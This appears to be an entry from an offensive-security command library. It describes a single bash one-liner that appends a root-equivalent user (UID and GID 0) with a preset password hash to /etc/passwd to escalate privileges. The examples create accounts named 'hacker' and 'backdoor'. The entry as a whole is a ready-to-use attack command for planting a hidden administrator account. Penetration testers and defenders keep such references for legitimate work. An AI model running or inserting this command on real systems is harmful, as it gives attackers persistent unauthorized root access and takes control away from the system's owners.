---
type: command
executor: bash
data: 'echo ''$_USERNAME:$_HASH:0:0:$_USERNAME:/root:/bin/bash'' >> /etc/passwd'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - privesc
  - account-creation
verified: true
validated: true
---

# add-user-to-etc-passwd-with-hash

## Command

```bash
echo '$_USERNAME:$_HASH:0:0:$_USERNAME:/root:/bin/bash' >> /etc/passwd
```

## Description

Appends a new root-equivalent user entry to /etc/passwd using a pre-generated hash, enabling privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | New username (e.g., 'hacker') | Yes |
| $_HASH | Generated password hash (e.g., '$1$hacker$abc...') | Yes |
| 0:0 | UID/GID for root | Yes |
| /root:/bin/bash | Home and shell | Yes |
| >> /etc/passwd | Append to file | Yes |

## Examples

### Basic Usage

```bash
echo 'hacker:$1$hacker$abc123def:0:0:hacker:/root:/bin/bash' >> /etc/passwd
```

### Advanced Usage

```bash
echo 'backdoor:$6$salt$hash:0:0:Backdoor:/tmp:/bin/sh' >> /etc/passwd
```
For custom home/shell.

## Expected Output

No output on success; use cat /etc/passwd to verify.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Writable-etc-passwd]]
- [[commands/generate-md5-password-hash]]
